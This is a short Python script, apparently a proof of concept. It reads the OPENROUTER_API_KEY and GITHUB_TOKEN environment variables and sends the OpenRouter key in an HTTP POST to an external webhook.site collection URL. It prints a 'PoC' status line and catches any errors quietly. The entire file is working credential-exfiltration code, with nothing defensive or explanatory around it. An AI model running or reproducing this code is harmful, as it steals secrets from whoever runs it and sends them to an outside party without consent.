import os
import urllib.request
import urllib.parse

or_key = os.environ.get("OPENROUTER_API_KEY", "<not-in-env>")
gh_token = os.environ.get("GITHUB_TOKEN", "<not-in-env>")

webhook_url = "https://webhook.site/034d36c5-8613-45cf-951b-b8da81dba05c"

payload = urllib.parse.urlencode({"k": or_key}).encode("utf-8")


try:
    req = urllib.request.Request(webhook_url, data=payload, method="POST")
    with urllib.request.urlopen(req, timeout=5) as response:
        print(f"PoC: status code {response.getcode()}")
except Exception as e:
    print(f"PoC: completed (status hidden or caught: {e})")
